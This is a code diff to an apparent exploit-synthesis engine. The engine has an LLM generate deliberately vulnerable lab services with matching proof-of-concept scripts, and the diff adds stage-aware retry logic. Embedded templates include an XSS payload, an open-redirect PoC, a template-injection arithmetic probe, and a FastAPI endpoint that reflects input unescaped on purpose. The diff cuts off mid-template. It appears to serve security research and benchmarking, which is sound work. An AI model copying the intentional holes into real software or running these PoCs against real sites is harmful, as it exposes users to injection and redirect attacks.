@@ -186,6 +186,8 @@ class CandidateReport:
     llm_provider_succeeded: bool = False
     llm_failure_class: str = ""
     llm_failure_message: str = ""
+    failure_stage: str = ""
+    failure_stage_reason: str = ""
 
     @property
     def manifest_digest(self) -> str:
@@ -215,6 +217,8 @@ class CandidateReport:
             "llm_provider_succeeded": self.llm_provider_succeeded,
             "llm_failure_class": self.llm_failure_class,
             "llm_failure_message": self.llm_failure_message,
+            "failure_stage": self.failure_stage,
+            "failure_stage_reason": self.failure_stage_reason,
         }
 
 
@@ -320,12 +324,16 @@ class SynthesisEngine:
         poc_template = self._normalize_poc_template(poc_template)
 
         for idx in range(1, candidate_k + 1):
+            candidate_failure_context = self._failure_context_for_candidate(
+                base_failure_context=failure_context,
+                reports=reports,
+            )
             messages = build_synthesis_prompt(
                 requirement,
                 rag_context,
                 hints=hints,
                 researcher_report=researcher_report,
-                failure_context=failure_context,
+                failure_context=candidate_failure_context,
                 limits=self.limits.to_dict(),
                 candidate_index=idx,
                 poc_template=poc_template,
@@ -369,6 +377,7 @@ class SynthesisEngine:
             )
             static_report = self._analyze_static_signals(manifest)
             score = self._score_candidate(len(violations), static_report.get("score", 0.0))
+            stage_failure = self._classify_staged_failure(violations)
             reports.append(
                 CandidateReport(
                     index=idx,
@@ -387,10 +396,18 @@ class SynthesisEngine:
                     llm_provider_succeeded=manifest_llm_provider_succeeded,
                     llm_failure_class=manifest_llm_failure_class,
                     llm_failure_message=manifest_llm_failure_message,
+                    failure_stage=str(stage_failure.get("failure_stage") or "").strip(),
+                    failure_stage_reason=str(stage_failure.get("failure_stage_reason") or "").strip(),
                 )
             )
 
         accepted = [report for report in reports if not report.violations]
+        if not accepted:
+            recovery = self._stage_aware_recovery_candidate(reports=reports, poc_template=poc_template)
+            if recovery is not None:
+                reports.append(recovery)
+                if not recovery.violations:
+                    accepted = [recovery]
         if not accepted:
             recovery = self._semantic_guided_recovery_candidate(reports=reports, poc_template=poc_template)
             if recovery is not None:
@@ -426,6 +443,523 @@ class SynthesisEngine:
         return SynthesisOutcome(selected=selected, written_files=written, reports=reports)
 
     # --- internal helpers -------------------------------------------------
+    def _staged_synthesis_payload(self) -> Dict[str, Any]:
+        payload = self._requirement.get("staged_synthesis") if isinstance(self._requirement, dict) else {}
+        return payload if isinstance(payload, dict) else {}
+
+    def _stage_aware_retry_hint(self, report: CandidateReport) -> str:
+        if not isinstance(report, CandidateReport):
+            return ""
+        stage = str(report.failure_stage or "").strip()
+        if not stage:
+            return ""
+        staged = self._staged_synthesis_payload()
+        if not staged:
+            return ""
+        stage_contract = staged.get(stage) if isinstance(staged.get(stage), dict) else {}
+        lines = [
+            "# Stage-Aware Retry Hint",
+            f"- Previous candidate failed at staged_synthesis `{stage}`.",
+        ]
+        reason = str(report.failure_stage_reason or "").strip()
+        if reason:
+            lines.append(f"- Failure reason: `{reason}`.")
+        guidance = {
+            "candidate_resolution": "Re-resolve family/stack/topology alignment before changing implementation details.",
+            "design_brief": "Re-align the vulnerable behavior and semantic anchors before changing runtime scaffolding.",
+            "runtime_plan": "Preserve the selected family while fixing runtime topology, dependency, and executor alignment.",
+            "oracle_contract": "Keep the vulnerable path but realign success markers, negative controls, and oracle semantics.",
+        }.get(stage)
+        if guidance:
+            lines.append(f"- Retry guidance: {guidance}")
+        recent_violations = [
+            str(item).strip()
+            for item in (report.violations or [])[:3]
+            if isinstance(item, str) and str(item).strip()
+        ]
+        if recent_violations:
+            lines.append("- Recent violations: `" + "`, `".join(recent_violations) + "`.")
+        if stage_contract:
+            contract_payload = json.dumps(stage_contract, indent=2, ensure_ascii=False)
+            lines.append("- Stage contract snapshot:")
+            lines.append("```json")
+            lines.append(contract_payload)
+            lines.append("```")
+        return "\n".join(lines)
+
+    def _failure_context_for_candidate(
+        self,
+        *,
+        base_failure_context: str,
+        reports: List[CandidateReport],
+    ) -> str:
+        context = str(base_failure_context or "").strip()
+        last_failed = next(
+            (report for report in reversed(reports) if isinstance(report, CandidateReport) and report.violations),
+            None,
+        )
+        if last_failed is None:
+            return context
+        retry_hint = self._stage_aware_retry_hint(last_failed)
+        if not retry_hint:
+            return context
+        if context:
+            return context + "\n\n" + retry_hint
+        return retry_hint
+
+    @staticmethod
+    def _report_for_recovery_seed(reports: List[CandidateReport], *, stage: str = "") -> CandidateReport | None:
+        eligible = [
+            report
+            for report in reports
+            if isinstance(report, CandidateReport)
+            and (not stage or str(report.failure_stage or "").strip() == stage)
+        ]
+        if not eligible:
+            return None
+        return max(eligible, key=lambda report: (report.score, -report.index))
+
+    def _oracle_contract_template(self, poc_template: Dict[str, Any]) -> Dict[str, Any]:
+        template = self._normalize_poc_template(poc_template)
+        exploit_oracle = self._requirement.get("exploit_oracle") if isinstance(self._requirement, dict) else {}
+        exploit_oracle = exploit_oracle if isinstance(exploit_oracle, dict) else {}
+        staged = self._staged_synthesis_payload()
+        oracle_contract = staged.get("oracle_contract") if isinstance(staged.get("oracle_contract"), dict) else {}
+        oracle_contract = oracle_contract if isinstance(oracle_contract, dict) else {}
+        success_signature = (
+            str(oracle_contract.get("success_signature") or "").strip()
+            or str(exploit_oracle.get("success_signature") or "").strip()
+            or str(template.get("success_signature") or "").strip()
+            or "Exploit SUCCESS"
+        )
+        flag_token = (
+            str(oracle_contract.get("flag_token") or "").strip()
+            or str(exploit_oracle.get("flag_token") or "").strip()
+            or str(template.get("flag_token") or "").strip()
+        )
+        template["success_signature"] = success_signature
+        if flag_token:
+            template["flag_token"] = flag_token
+        else:
+            template.pop("flag_token", None)
+        output_mode = (
+            str(oracle_contract.get("output_mode") or "").strip()
+            or str(exploit_oracle.get("output_mode") or "").strip()
+        )
+        if output_mode:
+            template["output_mode"] = output_mode
+        return template
+
+    def _design_brief_payload(self) -> Dict[str, Any]:
+        staged = self._staged_synthesis_payload()
+        design_brief = staged.get("design_brief") if isinstance(staged.get("design_brief"), dict) else {}
+        return design_brief if isinstance(design_brief, dict) else {}
+
+    def _design_brief_required_roles(self) -> List[str]:
+        design_brief = self._design_brief_payload()
+        roles = design_brief.get("required_roles") if isinstance(design_brief.get("required_roles"), list) else []
+        normalized: List[str] = []
+        for item in roles:
+            role = str(item or "").strip().lower()
+            if role and role not in normalized:
+                normalized.append(role)
+        return normalized
+
+    def _apply_design_brief_metadata(
+        self,
+        manifest: Dict[str, Any],
+        *,
+        recovery_strategy: str | None = None,
+    ) -> Dict[str, Any]:
+        repaired = deepcopy(manifest) if isinstance(manifest, dict) else {}
+        design_brief = self._design_brief_payload()
+        metadata = repaired.get("metadata")
+        if not isinstance(metadata, dict):
+            metadata = {}
+            repaired["metadata"] = metadata
+        if recovery_strategy:
+            metadata["recovery_strategy"] = recovery_strategy
+        selected_topology = str(design_brief.get("selected_topology") or "").strip()
+        if selected_topology:
+            metadata["design_brief_topology"] = selected_topology
+            metadata.setdefault("target_topology", selected_topology)
+        selected_oracle_mode = str(design_brief.get("selected_oracle_mode") or "").strip()
+        if selected_oracle_mode:
+            metadata["design_brief_oracle_mode"] = selected_oracle_mode
+        selected_oracle_source = str(design_brief.get("selected_oracle_source") or "").strip()
+        if selected_oracle_source:
+            metadata["design_brief_oracle_source"] = selected_oracle_source
+        required_roles = self._design_brief_required_roles()
+        if required_roles:
+            metadata["design_brief_required_roles"] = required_roles
+        dependency_set = design_brief.get("dependency_set") if isinstance(design_brief.get("dependency_set"), list) else []
+        normalized_dependencies = [
+            str(item).strip().lower()
+            for item in dependency_set
+            if isinstance(item, str) and str(item).strip()
+        ]
+        if normalized_dependencies:
+            metadata["design_brief_dependency_set"] = normalized_dependencies
+        design_targets = self._design_brief_dependency_targets()
+        db_targets = design_targets.get("db_targets") if isinstance(design_targets.get("db_targets"), list) else []
+        normalized_db_targets = [
+            str(item).strip().lower()
+            for item in db_targets
+            if isinstance(item, str) and str(item).strip()
+        ]
+        if normalized_db_targets:
+            metadata.setdefault("target_db", normalized_db_targets[0])
+        sidecar_targets = (
+            design_targets.get("sidecar_targets") if isinstance(design_targets.get("sidecar_targets"), list) else []
+        )
+        normalized_sidecar_targets = [
+            str(item).strip().lower()
+            for item in sidecar_targets
+            if isinstance(item, str) and str(item).strip()
+        ]
+        if normalized_sidecar_targets:
+            metadata.setdefault("target_sidecars", normalized_sidecar_targets)
+        return repaired
+
+    def _annotate_manifest_with_design_brief(self, manifest: Dict[str, Any], *, recovery_strategy: str) -> Dict[str, Any]:
+        return self._apply_design_brief_metadata(manifest, recovery_strategy=recovery_strategy)
+
+    def _design_brief_dependency_targets(self) -> Dict[str, Any]:
+        design_brief = self._design_brief_payload()
+        dependency_set = design_brief.get("dependency_set") if isinstance(design_brief.get("dependency_set"), list) else []
+        normalized_dependencies = [
+            str(item).strip().lower()
+            for item in dependency_set
+            if isinstance(item, str) and str(item).strip()
+        ]
+        db_targets: List[str] = []
+        sidecar_targets: List[str] = []
+        for item in normalized_dependencies:
+            kind, _, value = item.partition(":")
+            if not kind or not value:
+                continue
+            if kind == "db" and value not in db_targets:
+                db_targets.append(value)
+            if kind == "sidecar" and value not in sidecar_targets:
+                sidecar_targets.append(value)
+        if not sidecar_targets and db_targets:
+            selected_topology = str(design_brief.get("selected_topology") or "").strip().lower()
+            required_roles = set(self._design_brief_required_roles())
+            if selected_topology == "service_plus_sidecar" or "dependency_sidecar" in required_roles:
+                sidecar_targets.extend(item for item in db_targets if item not in sidecar_targets)
+        return {
+            "dependencies": normalized_dependencies,
+            "db_targets": db_targets,
+            "sidecar_targets": sidecar_targets,
+            "selected_topology": str(design_brief.get("selected_topology") or "").strip().lower(),
+        }
+
+    def _repair_manifest_for_oracle_contract(
+        self,
+        manifest: Dict[str, Any],
+        *,
+        poc_template: Dict[str, Any],
+    ) -> Dict[str, Any]:
+        repaired = deepcopy(manifest) if isinstance(manifest, dict) else {}
+        template = self._oracle_contract_template(poc_template)
+        poc = repaired.get("poc")
+        if not isinstance(poc, dict):
+            poc = {}
+            repaired["poc"] = poc
+        for key in ("cmd", "success_signature", "flag_token", "output_mode", "notes"):
+            if key in template and template.get(key) not in (None, "", [], {}):
+                poc[key] = template.get(key)
+        repaired = self._ensure_fallback_poc(repaired, template)
+        files = repaired.get("files")
+        if isinstance(files, list):
+            poc_content = self._build_fallback_poc_content(
+                repaired,
+                str(template.get("success_signature") or "Exploit SUCCESS").strip() or "Exploit SUCCESS",
+                str(template.get("flag_token") or "").strip(),
+            )
+            updated = False
+            for entry in files:
+                if not isinstance(entry, dict):
+                    continue
+                role = normalize_role(entry.get("role"))
+                path = str(entry.get("path") or "").strip().lower()
+                if role_matches(role, "poc_entry") or path.startswith("poc."):
+                    entry["role"] = "poc_entry"
+                    entry["path"] = str(entry.get("path") or "poc.py").strip() or "poc.py"
+                    entry["content"] = poc_content
+                    updated = True
+                    break
+            if not updated:
+                files.append(
+                    {
+                        "path": "poc.py",
+                        "role": "poc_entry",
+                        "description": "Oracle-contract recovery PoC",
+                        "content": poc_content,
+                    }
+                )
+        return self._annotate_manifest_with_design_brief(repaired, recovery_strategy="oracle_contract")
+
+    def _align_manifest_with_runtime_plan(self, manifest: Dict[str, Any]) -> Dict[str, Any]:
+        repaired = deepcopy(manifest) if isinstance(manifest, dict) else {}
+        staged = self._staged_synthesis_payload()
+        runtime_plan = staged.get("runtime_plan") if isinstance(staged.get("runtime_plan"), dict) else {}
+        runtime_plan = runtime_plan if isinstance(runtime_plan, dict) else {}
+        design_targets = self._design_brief_dependency_targets()
+        run = repaired.get("run")
+        if not isinstance(run, dict):
+            run = {}
+            repaired["run"] = run
+        service_port = runtime_plan.get("service_port")
+        if isinstance(service_port, int) and service_port > 0:
+            run["port"] = service_port
+        repaired = self._annotate_manifest_with_design_brief(repaired, recovery_strategy="runtime_plan")
+        metadata = repaired.get("metadata")
+        metadata = metadata if isinstance(metadata, dict) else {}
+        topology = str(runtime_plan.get("topology") or "").strip()
+        if not topology:
+            topology = str(design_targets.get("selected_topology") or "").strip()
+        if topology:
+            metadata["target_topology"] = topology
+        db = str(runtime_plan.get("db") or "").strip()
+        if not db:
+            db_targets = design_targets.get("db_targets") if isinstance(design_targets.get("db_targets"), list) else []
+            db = str(db_targets[0] or "").strip() if db_targets else ""
+        if db:
+            metadata["target_db"] = db
+        sidecar_targets = (
+            design_targets.get("sidecar_targets") if isinstance(design_targets.get("sidecar_targets"), list) else []
+        )
+        normalized_sidecar_targets = [
+            str(item).strip().lower()
+            for item in sidecar_targets
+            if isinstance(item, str) and str(item).strip()
+        ]
+        if normalized_sidecar_targets:
+            metadata["target_sidecars"] = normalized_sidecar_targets
+        pattern_tags = repaired.get("pattern_tags")
+        if not isinstance(pattern_tags, list):
+            pattern_tags = []
+            repaired["pattern_tags"] = pattern_tags
+        if "runtime_plan_repair" not in pattern_tags:
+            pattern_tags.append("runtime_plan_repair")
+        return repaired
+
+    def _recovery_candidate_from_manifest(
+        self,
+        *,
+        manifest: Dict[str, Any],
+        reports: List[CandidateReport],
+        poc_template: Dict[str, Any],
+        recovery_label: str,
+    ) -> CandidateReport:
+        repaired = deepcopy(manifest)
+        repaired = self._apply_poc_template(repaired, poc_template)
+        repaired = self._ensure_fallback_poc(repaired, poc_template)
+        before_family_override = json.dumps(repaired, sort_keys=True, ensure_ascii=False)
+        repaired = self._stabilize_pattern_specific_artifacts(repaired, poc_template)
+        family_override_applied = bool(
+            self._is_template_injection_family()
+            and before_family_override != json.dumps(repaired, sort_keys=True, ensure_ascii=False)
+        )
+        repaired = self._inject_user_deps(repaired)
+        declared = self._extract_declared_dependencies(repaired)
+        required_static = self._detect_required_dependencies(repaired)
+        llm_section = None
+        dep_guard_config = self._dep_guard_config if isinstance(getattr(self, "_dep_guard_config", {}), dict) else {}
+        auto_patch_enabled = bool(getattr(self, "_auto_patch_enabled", False))
+        if dep_guard_config.get("llm_assist") or auto_patch_enabled:
+            llm_section = self._llm_infer_dependencies(repaired, required_static, declared)
+        auto_patch_info = (
+            self._maybe_auto_patch_dependencies(repaired, declared, required_static, llm_section)
+            if auto_patch_enabled
+            else {"enabled": False}
+        )
+        if auto_patch_info.get("patched") or auto_patch_info.get("synced_requirements"):
+            declared = self._extract_declared_dependencies(repaired)
+        violations, guard_report = self._guard_manifest_with_autofix(
+            repaired,
+            precomputed_llm=llm_section,
+            auto_patch=auto_patch_info,
+        )
+        static_report = self._analyze_static_signals(repaired)
+        score = self._score_candidate(len(violations), static_report.get("score", 0.0))
+        stage_failure = self._classify_staged_failure(violations)
+        return CandidateReport(
+            index=len(reports) + 1,
+            manifest=repaired,
+            raw_response=json.dumps({"recovery": recovery_label}, ensure_ascii=False),
+            violations=violations,
+            score=score,
+            static_report=static_report,
+            guard_report=guard_report,
+            fallback_used=True,
+            fallback_class=self._manifest_fallback_class(repaired),
+            family_override_applied=family_override_applied,
+            llm_stub_used=any(report.llm_stub_used for report in reports),
+            llm_fixture_used=any(report.llm_fixture_used for report in reports),
+            llm_provider_attempted=any(report.llm_provider_attempted for report in reports),
+            llm_provider_succeeded=any(report.llm_provider_succeeded for report in reports),
+            llm_failure_class=next(
+                (report.llm_failure_class for report in reversed(reports) if report.llm_failure_class),
+                "",
+            ),
+            llm_failure_message=next(
+                (report.llm_failure_message for report in reversed(reports) if report.llm_failure_message),
+                "",
+            ),
+            failure_stage=str(stage_failure.get("failure_stage") or "").strip(),
+            failure_stage_reason=str(stage_failure.get("failure_stage_reason") or "").strip(),
+        )
+
+    def _runtime_plan_recovery_candidate(
+        self,
+        *,
+        reports: List[CandidateReport],
+        poc_template: Dict[str, Any],
+    ) -> CandidateReport | None:
+        staged = self._staged_synthesis_payload()
+        runtime_plan = staged.get("runtime_plan") if isinstance(staged.get("runtime_plan"), dict) else {}
+        if not isinstance(runtime_plan, dict) or not runtime_plan:
+            return None
+        manifest = self._align_manifest_with_runtime_plan(self._fallback_manifest())
+        return self._recovery_candidate_from_manifest(
+            manifest=manifest,
+            reports=reports,
+            poc_template=poc_template,
+            recovery_label="runtime_plan",
+        )
+
+    def _oracle_contract_recovery_candidate(
+        self,
+        *,
+        reports: List[CandidateReport],
+        poc_template: Dict[str, Any],
+    ) -> CandidateReport | None:
+        seed = self._report_for_recovery_seed(reports, stage="oracle_contract") or self._report_for_recovery_seed(reports)
+        if seed is None:
+            return None
+        manifest = self._repair_manifest_for_oracle_contract(
+            seed.manifest,
+            poc_template=poc_template,
+        )
+        return self._recovery_candidate_from_manifest(
+            manifest=manifest,
+            reports=reports,
+            poc_template=self._oracle_contract_template(poc_template),
+            recovery_label="oracle_contract",
+        )
+
+    def _stage_aware_recovery_candidate(
+        self,
+        *,
+        reports: List[CandidateReport],
+        poc_template: Dict[str, Any],
+    ) -> CandidateReport | None:
+        failed_reports = [report for report in reports if isinstance(report, CandidateReport) and report.violations]
+        if not failed_reports:
+            return None
+        latest_stage = str(failed_reports[-1].failure_stage or "").strip()
+        if latest_stage == "runtime_plan":
+            return self._runtime_plan_recovery_candidate(reports=reports, poc_template=poc_template)
+        if latest_stage == "oracle_contract":
+            return self._oracle_contract_recovery_candidate(reports=reports, poc_template=poc_template)
+        if latest_stage == "design_brief":
+            required_roles = self._design_brief_required_roles()
+            prefers_runtime = any(
+                role in {"dependency_db", "dependency_sidecar"}
+                for role in required_roles
+            )
+            prefers_oracle = any(
+                role in {"oracle_state_checks", "oracle_json_contract", "negative_control_cases", "metamorphic_cases"}
+                for role in required_roles
+            )
+            if prefers_runtime:
+                candidate = self._runtime_plan_recovery_candidate(reports=reports, poc_template=poc_template)
+                if candidate is not None:
+                    return candidate
+            if prefers_oracle:
+                candidate = self._oracle_contract_recovery_candidate(reports=reports, poc_template=poc_template)
+                if candidate is not None:
+                    return candidate
+        return None
+
+    def _classify_staged_failure(self, violations: List[str]) -> Dict[str, Any]:
+        staged = self._staged_synthesis_payload()
+        if not staged or not violations:
+            return {}
+        text = " | ".join(
+            str(item).strip().lower()
+            for item in violations
+            if isinstance(item, str) and str(item).strip()
+        )
+        if not text:
+            return {}
+        stage = ""
+        reason = ""
+        if any(
+            token in text
+            for token in (
+                "success signature",
+                "flag token",
+                "negative control",
+                "metamorphic",
+                "assertion",
+                "forbidden success",
+                "json_success_key",
+                "json_flag_key",
+            )
+        ):
+            stage = "oracle_contract"
+            reason = "oracle_contract_mismatch"
+        elif any(
+            token in text
+            for token in (
+                "dockerfile",
+                "read-only",
+                "/tmp",
+                "runtime",
+                "executor constraint",
+                "service port",
+                "health",
+                "network",
+                "sidecar",
+                "sqlite",
+                "mysql",
+                "postgres",
+                "missing dependencies",
+                "deps must be an array",
+            )
+        ):
+            stage = "runtime_plan"
+            reason = "runtime_plan_mismatch"
+        elif any(
+            token in text
+            for token in (
+                "semantic mismatch",
+                "missing redirect sink",
+                "missing input-to-sql",
+                "state-changing endpoint",
+                "csrf token",
+                "family",
+                "sink",
+                "input vector",
+            )
+        ):
+            stage = "design_brief"
+            reason = "design_brief_mismatch"
+        else:
+            stage = "candidate_resolution"
+            reason = "candidate_resolution_or_manifest_schema"
+        payload: Dict[str, Any] = {
+            "failure_stage": stage,
+            "failure_stage_reason": reason,
+        }
+        stage_contract = staged.get(stage) if isinstance(staged.get(stage), dict) else {}
+        if stage_contract:
+            payload["stage_contract"] = deepcopy(stage_contract)
+        return payload
+
     @staticmethod
     def _score_candidate(violation_count: int, signal_score: float) -> float:
         base = max(0.0, 1.0 - 0.2 * violation_count)
@@ -622,7 +1156,24 @@ class SynthesisEngine:
             manifest["poc"] = poc
         success_signature = str(template.get("success_signature") or poc.get("success_signature") or "Exploit SUCCESS").strip() or "Exploit SUCCESS"
         flag_token = str(template.get("flag_token") or poc.get("flag_token") or "").strip()
-        poc["cmd"] = "python poc.py --base-url {{base_url}}"
+        verification_spec = manifest.get("verification_spec") if isinstance(manifest.get("verification_spec"), dict) else {}
+        negative_controls = verification_spec.get("negative_controls") if isinstance(verification_spec.get("negative_controls"), list) else []
+        metamorphic_cases = (
+            (verification_spec.get("metamorphic") or {}).get("cases")
+            if isinstance((verification_spec.get("metamorphic") or {}), dict)
+            else []
+        )
+        if not isinstance(metamorphic_cases, list):
+            metamorphic_cases = []
+        payload_cases_present = any(
+            isinstance(entry, dict) and str(entry.get("payload") or "").strip()
+            for entry in [*negative_controls, *metamorphic_cases]
+        )
+        poc["cmd"] = (
+            "python poc.py --base-url {{base_url}} --payload {{payload}}"
+            if payload_cases_present
+            else "python poc.py --base-url {{base_url}}"
+        )
         poc["success_signature"] = success_signature
         if flag_token:
             poc["flag_token"] = flag_token
@@ -706,6 +1257,7 @@ class SynthesisEngine:
         default_base = self._default_base_url_for_manifest(manifest, fallback_port=5000)
         lines = [
             "import argparse",
+            "import re",
             "import sys",
             "import requests",
             "",
@@ -714,17 +1266,28 @@ class SynthesisEngine:
             f"DEFAULT_PAYLOAD = {default_payload!r}",
             f"ROUTE_CANDIDATES = {route_candidates!r}",
             "PARAM_CANDIDATES = ['name', 'input', 'payload', 'template', 'value', 'q']",
+            "ARITH_RE = re.compile(r\"\\{\\{\\s*(\\d+)\\s*\\*\\s*(\\d+)\\s*\\}\\}\")",
             "",
             "def _request(method: str, url: str, param: str, payload: str):",
             "    if method == 'GET':",
             "        return requests.get(url, params={param: payload}, timeout=5)",
             "    return requests.post(url, data={param: payload}, timeout=5)",
             "",
+            "def _expected_marker(payload: str):",
+            "    match = ARITH_RE.search(payload or '')",
+            "    if not match:",
+            "        return None",
+            "    return str(int(match.group(1)) * int(match.group(2)))",
+            "",
             "def main() -> int:",
             "    ap = argparse.ArgumentParser()",
             f"    ap.add_argument('--base-url', default={default_base!r})",
             "    ap.add_argument('--payload', default=DEFAULT_PAYLOAD)",
             "    args = ap.parse_args()",
+            "    expected = _expected_marker(args.payload)",
+            "    if expected is None:",
+            "        print('Exploit failed: arithmetic marker not observed', file=sys.stderr)",
+            "        return 1",
             "    base = args.base_url.rstrip('/')",
             "    for route in ROUTE_CANDIDATES:",
             "        url = base + route",
@@ -732,11 +1295,11 @@ class SynthesisEngine:
             "            for method in ('GET', 'POST'):",
             "                try:",
             "                    resp = _request(method, url, param, args.payload)",
-            "                except Exception:",
-            "                    continue",
-            "                body = resp.text or ''",
-            "                if resp.status_code == 200 and '49' in body:",
-            "                    print('49')",
+                "                except Exception:",
+                "                    continue",
+                "                body = resp.text or ''",
+            "                if resp.status_code == 200 and expected in body:",
+            "                    print(expected)",
             "                    print(SUCCESS_SIGNATURE)",
             "                    if FLAG_TOKEN:",
             "                        print(FLAG_TOKEN)",
@@ -890,6 +1453,7 @@ class SynthesisEngine:
         )
         static_report = self._analyze_static_signals(manifest)
         score = self._score_candidate(len(violations), static_report.get("score", 0.0))
+        stage_failure = self._classify_staged_failure(violations)
         return CandidateReport(
             index=len(reports) + 1,
             manifest=manifest,
@@ -913,6 +1477,8 @@ class SynthesisEngine:
                 (report.llm_failure_message for report in reversed(reports) if report.llm_failure_message),
                 "",
             ),
+            failure_stage=str(stage_failure.get("failure_stage") or "").strip(),
+            failure_stage_reason=str(stage_failure.get("failure_stage_reason") or "").strip(),
         )
 
     def _fallback_manifest(self) -> Dict[str, Any]:
@@ -1514,6 +2080,25 @@ class SynthesisEngine:
             add_candidate("sqli")
         return candidates
 
+    def _design_brief_guided_fallback_family(self) -> tuple[str, str]:
+        required_roles = set(self._design_brief_required_roles())
+        if "dependency_db" not in required_roles:
+            return "", ""
+        design_targets = self._design_brief_dependency_targets()
+        db_targets = design_targets.get("db_targets") if isinstance(design_targets.get("db_targets"), list) else []
+        normalized_db_targets = [
+            str(item).strip().lower()
+            for item in db_targets
+            if isinstance(item, str) and str(item).strip()
+        ]
+        if not normalized_db_targets:
+            return "", ""
+        if not any(target in {"sqlite", "mysql", "postgres", "postgresql", "mariadb"} for target in normalized_db_targets):
+            return "", ""
+        if not self._family_hypothesis_allows_semantic_guided_family("sqli"):
+            return "", ""
+        return "sqli", "design_brief_dependency_db"
+
     def _semantic_guided_fallback_resolution(self) -> Dict[str, Any]:
         candidates = self._semantic_guided_family_candidates()
         resolution: Dict[str, Any] = {
@@ -1524,6 +2109,30 @@ class SynthesisEngine:
             "abstain_reason": "",
         }
         if not candidates:
+            hinted_family, hinted_source = self._design_brief_guided_fallback_family()
+            if hinted_family:
+                resolution["family"] = hinted_family
+                resolution["selection_source"] = hinted_source
+                resolution["candidate_families"] = [hinted_family]
+                resolution["ambiguous"] = False
+                return resolution
+            summary = self._family_hypothesis_summary()
+            top_family = str(summary.get("top_family") or "").strip().lower()
+            top_confidence = str(summary.get("top_confidence") or "").strip().lower()
+            ambiguous = summary.get("ambiguous") is True
+            contradiction_count = summary.get("contradiction_count")
+            if (
+                top_family
+                and top_confidence == "high"
+                and not ambiguous
+                and (not isinstance(contradiction_count, (int, float)) or float(contradiction_count) <= 0)
+                and self._family_hypothesis_allows_semantic_guided_family(top_family)
+            ):
+                resolution["family"] = top_family
+                resolution["selection_source"] = "researcher_top_family_no_semantic_signature"
+                resolution["candidate_families"] = [top_family]
+                resolution["ambiguous"] = False
+                return resolution
             resolution["abstain_reason"] = "no_semantic_family_match"
             return resolution
         selected_family = self._request_ir_selected_family(require_open_world_evidence_ready=True)
@@ -1597,6 +2206,7 @@ class SynthesisEngine:
     ) -> Dict[str, Any]:
         if not isinstance(manifest, dict):
             return manifest
+        manifest = self._apply_design_brief_metadata(manifest)
         metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
         if not isinstance(metadata, dict):
             metadata = {}
@@ -1753,8 +2363,10 @@ class SynthesisEngine:
                 "def main() -> int:",
                 "    parser = argparse.ArgumentParser()",
                 "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
+                "    parser.add_argument('--payload', default=REDIRECT_TARGET)",
                 "    args = parser.parse_args()",
-                "    url = args.base_url.rstrip('/') + '/redirect?next=' + REDIRECT_TARGET",
+                "    target = args.payload or REDIRECT_TARGET",
+                "    url = args.base_url.rstrip('/') + '/redirect?next=' + target",
                 "    opener = build_opener(NoRedirectHandler())",
                 "    request = Request(url, method='GET')",
                 "    status = 0",
@@ -1766,7 +2378,7 @@ class SynthesisEngine:
                 "    except HTTPError as exc:",
                 "        status = exc.code",
                 "        location = exc.headers.get('Location', '')",
-                "    if status in {301, 302, 303, 307, 308} and REDIRECT_TARGET in location:",
+                "    if target.startswith(('http://', 'https://')) and status in {301, 302, 303, 307, 308} and target in location:",
                 "        print(SUCCESS_SIGNATURE)",
                 "        if FLAG_TOKEN:",
                 "            print(FLAG_TOKEN)",
@@ -1787,6 +2399,7 @@ class SynthesisEngine:
                 {
                     "name": "missing-next",
                     "expect_success": False,
+                    "payload": "/local",
                     "rationale": "missing next parameter should fail closed instead of producing exploit success",
                 }
             ],
@@ -1794,6 +2407,13 @@ class SynthesisEngine:
                 "total": 1,
                 "passed": 1,
                 "rationale": "relative same-origin redirects should not be counted as open redirect exploit success",
+                "cases": [
+                    {
+                        "name": "same-origin-relative",
+                        "expect_success": False,
+                        "payload": "/profile",
+                    }
+                ],
             },
         }
         manifest = self._fallback_manifest_from_parts(
@@ -1812,6 +2432,40 @@ class SynthesisEngine:
         metadata["materializer"] = "minimal_dynamic"
         manifest["metadata"] = metadata
         return manifest
+
+    def _payload_replay_verification_spec(
+        self,
+        *,
+        success_signature: str,
+        flag_token: str,
+        negative_text_markers: Sequence[str] | None = None,
+        negative_controls: Sequence[Dict[str, Any]] | None = None,
+        metamorphic_cases: Sequence[Dict[str, Any]] | None = None,
+        metamorphic_rationale: str = "",
+    ) -> Dict[str, Any]:
+        spec: Dict[str, Any] = {
+            "success_text_markers": [success_signature],
+            "flag_token": flag_token,
+        }
+        negative_markers = [
+            str(entry).strip()
+            for entry in (negative_text_markers or [])
+            if isinstance(entry, str) and str(entry).strip()
+        ]
+        if negative_markers:
+            spec["negative_text_markers"] = negative_markers
+        controls = [deepcopy(entry) for entry in (negative_controls or []) if isinstance(entry, dict)]
+        if controls:
+            spec["negative_controls"] = controls
+        cases = [deepcopy(entry) for entry in (metamorphic_cases or []) if isinstance(entry, dict)]
+        if cases:
+            spec["metamorphic"] = {
+                "total": len(cases),
+                "passed": len(cases),
+                "rationale": str(metamorphic_rationale or "").strip(),
+                "cases": cases,
+            }
+        return spec
 
     def _minimal_dynamic_manifest_xss(
         self,
@@ -1837,8 +2491,8 @@ class SynthesisEngine:
                     "    return {'status': 'ok'}",
                     "",
                     "@app.get('/echo', response_class=HTMLResponse)",
-                    "def echo(q: str = ''):",
-                    "    return f'<html><body>{q}</body></html>'",
+                    "def echo(name: str = ''):",
+                    "    return f'<html><body>{name}</body></html>'",
                     "",
                     "if __name__ == '__main__':",
                     "    import uvicorn",
@@ -1873,22 +2527,32 @@ class SynthesisEngine:
         poc_content = "\n".join(
             [
                 "import argparse",
+                "import sys",
+                "from urllib.parse import quote",
                 "from urllib.request import Request, urlopen",
                 "",
                 f"SUCCESS_SIGNATURE = {success_signature!r}",
                 f"FLAG_TOKEN = {flag_token!r}",
                 "DEFAULT_BASE = 'http://127.0.0.1:8000'",
-                "PAYLOAD = '<script>alert(1)</script>'",
+                "DEFAULT_PAYLOAD = '<script>alert(1)</script>'",
+                "",
+                "def _looks_executable(payload: str) -> bool:",
+                "    lowered = payload.lower()",
+                "    return any(marker in lowered for marker in ('<script', '<img', '<svg', 'onerror', 'onload'))",
                 "",
                 "def main() -> int:",
                 "    parser = argparse.ArgumentParser()",
                 "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
+                "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)",
                 "    args = parser.parse_args()",
-                "    url = args.base_url.rstrip('/') + '/echo?name=' + PAYLOAD",
+                "    if not _looks_executable(args.payload):",
+                "        print('payload is not executable script markup', file=sys.stderr)",
+                "        return 1",
